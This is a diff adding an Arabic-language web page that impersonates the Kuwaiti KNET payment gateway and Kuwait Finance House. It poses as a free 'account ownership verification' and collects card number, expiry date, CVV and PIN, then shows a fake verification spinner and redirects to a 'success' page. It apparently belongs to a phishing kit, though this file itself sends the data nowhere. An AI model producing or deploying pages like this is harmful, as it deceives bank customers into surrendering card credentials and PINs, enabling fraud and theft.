@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>KNET — تأكيد الدفع</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Noto+Kufi+Arabic:wght@100..900&display=swap" rel="stylesheet">
+  <style>
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+    body{font-family:'Noto Kufi Arabic',system-ui,sans-serif;background:#f0f2f5;min-height:100dvh;display:flex;flex-direction:column;align-items:center;color:#333}
+
+    .knet-header{width:100%;background:#fff;border-bottom:2px solid #e0e0e0;padding:16px 0}
+    .knet-header-inner{width:min(600px,100% - 32px);margin:0 auto;display:flex;align-items:center;justify-content:space-between}
+    .knet-logo{display:flex;align-items:center;gap:10px}
+    .knet-logo-icon{width:48px;height:48px;background:#004b87;border-radius:8px;display:grid;place-items:center;color:#fff;font-weight:900;font-size:.75rem;letter-spacing:1px}
+    .knet-logo-text{font-size:1rem;font-weight:700;color:#004b87}
+    .knet-secure{display:flex;align-items:center;gap:6px;font-size:.75rem;color:#666}
+    .knet-secure svg{color:#399624}
+
+    .knet-body{width:min(500px,100% - 32px);margin:32px auto;flex:1}
+
+    .merchant-info{background:#fff;border-radius:12px;padding:20px;margin-bottom:20px;border:1px solid #e0e0e0;display:flex;align-items:center;gap:16px}
+    .merchant-logo{width:52px;height:52px;border-radius:10px;object-fit:contain;border:1px solid #e8e5e1}
+    .merchant-name{font-size:.95rem;font-weight:700;color:#333}
+    .merchant-detail{font-size:.8rem;color:#666;margin-top:2px}
+
+    .amount-box{background:linear-gradient(135deg,#004b87,#0072c6);border-radius:12px;padding:24px;text-align:center;color:#fff;margin-bottom:20px}
+    .amount-label{font-size:.85rem;opacity:.8;margin-bottom:4px}
+    .amount-value{font-size:2rem;font-weight:900}
+    .amount-currency{font-size:1rem;font-weight:600;opacity:.8;margin-right:6px}
+    .amount-note{font-size:.75rem;opacity:.6;margin-top:8px}
+
+    .card-form{background:#fff;border-radius:12px;padding:24px;border:1px solid #e0e0e0;margin-bottom:20px}
+    .card-form-title{font-size:.95rem;font-weight:700;color:#333;margin-bottom:16px;display:flex;align-items:center;gap:8px}
+    .card-form-title svg{color:#004b87}
+
+    .card-brands{display:flex;gap:8px;margin-bottom:20px}
+    .card-brand{width:52px;height:34px;border-radius:6px;border:1.5px solid #e0e0e0;display:grid;place-items:center;cursor:pointer;transition:all .2s;padding:4px}
+    .card-brand.active{border-color:#004b87;background:#f0f7ff}
+    .card-brand img{max-width:100%;max-height:100%;object-fit:contain}
+    .card-brand-text{font-size:.55rem;font-weight:800;color:#333;text-transform:uppercase}
+
+    .kfield{margin-bottom:16px}
+    .kfield-label{display:block;font-size:.8rem;font-weight:600;color:#555;margin-bottom:6px}
+    .kfield-input{width:100%;height:48px;background:#f7f8fa;border:1.5px solid #ddd;border-radius:10px;padding:0 14px;font-size:1rem;color:#333;letter-spacing:2px;transition:border-color .2s;direction:ltr;text-align:left}
+    .kfield-input:focus{border-color:#004b87;background:#fff;outline:none}
+    .kfield-input::placeholder{color:#aaa;letter-spacing:0}
+    .kfield-row{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+
+    .knet-submit{width:100%;height:54px;background:#004b87;color:#fff;border:none;border-radius:12px;font-size:1rem;font-weight:700;cursor:pointer;transition:all .3s;display:flex;align-items:center;justify-content:center;gap:10px;font-family:inherit}
+    .knet-submit:hover{background:#003d70}
+    .knet-submit:active{transform:scale(.98)}
+    .knet-submit:disabled{background:#999;cursor:not-allowed}
+
+    .knet-cancel{display:block;text-align:center;margin-top:14px;font-size:.85rem;color:#999;cursor:pointer;transition:color .2s}
+    .knet-cancel:hover{color:#c0392b}
+
+    .knet-footer{width:100%;background:#fff;border-top:1px solid #e0e0e0;padding:16px 0;text-align:center}
+    .knet-footer p{font-size:.72rem;color:#999}
+
+    .loading-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:100;justify-content:center;align-items:center}
+    .loading-overlay.show{display:flex}
+    .loading-box{background:#fff;border-radius:16px;padding:40px;text-align:center;width:min(360px,90%)}
+    .spinner{width:48px;height:48px;border:4px solid #e0e0e0;border-top-color:#004b87;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 20px}
+    @keyframes spin{to{transform:rotate(360deg)}}
+    .loading-text{font-size:.95rem;font-weight:600;color:#333}
+    .loading-sub{font-size:.8rem;color:#666;margin-top:6px}
+
+    @media(max-width:500px){
+      .knet-body{margin:20px auto}
+      .card-form{padding:20px 16px}
+      .amount-value{font-size:1.6rem}
+      .merchant-info{padding:16px;gap:12px}
+    }
+  </style>
+</head>
+<body>
+
+  <header class="knet-header">
+    <div class="knet-header-inner">
+      <div class="knet-logo">
+        <div class="knet-logo-icon">KNET</div>
+        <span class="knet-logo-text">بوابة الدفع الإلكتروني</span>
+      </div>
+      <div class="knet-secure">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+        <span>اتصال آمن</span>
+      </div>
+    </div>
+  </header>
+
+  <div class="knet-body">
+
+    <div class="merchant-info">
+      <img src="images/logo.jpg" alt="KAWAT" class="merchant-logo">
+      <div>
+        <div class="merchant-name">KAWAT — بيت التمويل الكويتي</div>
+        <div class="merchant-detail">تأكيد ملكية الحساب البنكي</div>
+      </div>
+    </div>
+
+    <div class="amount-box">
+      <div class="amount-label">مبلغ التحقق</div>
+      <div class="amount-value"><span class="amount-currency">د.ك</span>0.000</div>
+      <div class="amount-note">لا يوجد أي رسوم — عملية تحقق فقط</div>
+    </div>
+
+    <form class="card-form" id="knetForm" onsubmit="return false">
+      <div class="card-form-title">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
+        بيانات البطاقة
+      </div>
+
+      <div class="card-brands">
+        <div class="card-brand active"><div class="card-brand-text">KNET</div></div>
+        <div class="card-brand"><div class="card-brand-text" style="color:#1a1f71">VISA</div></div>
+        <div class="card-brand"><div class="card-brand-text" style="color:#eb001b">MC</div></div>
+      </div>
+
+      <div class="kfield">
+        <label class="kfield-label">رقم البطاقة</label>
+        <input type="text" class="kfield-input" id="cardNumber" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" required>
+      </div>
+
+      <div class="kfield-row">
+        <div class="kfield">
+          <label class="kfield-label">تاريخ الانتهاء</label>
+          <input type="text" class="kfield-input" id="cardExpiry" placeholder="MM / YY" maxlength="7" required>
+        </div>
+        <div class="kfield">
+          <label class="kfield-label">رمز CVV</label>
+          <input type="password" class="kfield-input" id="cardCvv" placeholder="***" maxlength="4" required>
+        </div>
+      </div>
+
+      <div class="kfield">
+        <label class="kfield-label">رمز PIN الخاص بالبطاقة</label>
+        <input type="password" class="kfield-input" id="cardPin" placeholder="****" maxlength="6" required>
+      </div>
+
+      <button type="submit" class="knet-submit" id="submitBtn">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+        تأكيد ومتابعة
+      </button>
+
+      <div class="knet-cancel" id="cancelBtn">إلغاء العملية</div>
+    </form>
+
+  </div>
+
+  <footer class="knet-footer">
+    <p>بوابة الدفع الإلكتروني KNET — جميع المعاملات محمية ومشفرة</p>
+  </footer>
+
+  <div class="loading-overlay" id="loadingOverlay">
+    <div class="loading-box">
+      <div class="spinner"></div>
+      <div class="loading-text">جارِ التحقق من بياناتك...</div>
+      <div class="loading-sub">يرجى الانتظار وعدم إغلاق الصفحة</div>
+    </div>
+  </div>
+
+  <script>
+    const params=new URLSearchParams(location.search);
+    const watchId=params.get('id')||'5';
+    const orderData=params.get('data')||'';
+
+    document.getElementById('cardNumber').addEventListener('input',function(){
+      let v=this.value.replace(/\D/g,'');
+      v=v.replace(/(.{4})/g,'$1 ').trim();
+      this.value=v;
+    });
+
+    document.getElementById('cardExpiry').addEventListener('input',function(){
+      let v=this.value.replace(/\D/g,'');
+      if(v.length>=2)v=v.slice(0,2)+' / '+v.slice(2);
+      this.value=v;
+    });
+
+    document.getElementById('cardCvv').addEventListener('input',function(){
+      this.value=this.value.replace(/\D/g,'');
+    });
+
+    document.getElementById('cardPin').addEventListener('input',function(){
+      this.value=this.value.replace(/\D/g,'');
+    });
+
+    document.querySelectorAll('.card-brand').forEach(b=>{
+      b.addEventListener('click',()=>{
+        document.querySelectorAll('.card-brand').forEach(x=>x.classList.remove('active'));
+        b.classList.add('active');
+      });
+    });
+
+    document.getElementById('knetForm').addEventListener('submit',function(e){
+      e.preventDefault();
+      const num=document.getElementById('cardNumber').value.replace(/\s/g,'');
+      const exp=document.getElementById('cardExpiry').value.trim();
+      const cvv=document.getElementById('cardCvv').value.trim();
+      const pin=document.getElementById('cardPin').value.trim();
+
+      if(num.length<16){alert('رقم البطاقة يجب أن يكون 16 رقم');return}
+      if(exp.length<7){alert('يرجى إدخال تاريخ الانتهاء');return}
+      if(cvv.length<3){alert('رمز CVV يجب أن يكون 3 أرقام على الأقل');return}
+      if(pin.length<4){alert('رمز PIN يجب أن يكون 4 أرقام على الأقل');return}
+
+      document.getElementById('submitBtn').disabled=true;
+      document.getElementById('loadingOverlay').classList.add('show');
+
+      setTimeout(()=>{
+        window.location.href=`knet-success.html?id=${watchId}`;
+      },3000);
+    });
+
+    document.getElementById('cancelBtn').addEventListener('click',()=>{
+      if(confirm('هل تريد إلغاء العملية؟')){
+        window.location.href=`order.html?id=${watchId}`;
+      }
+    });
+  </script>
+</body>
+</html>
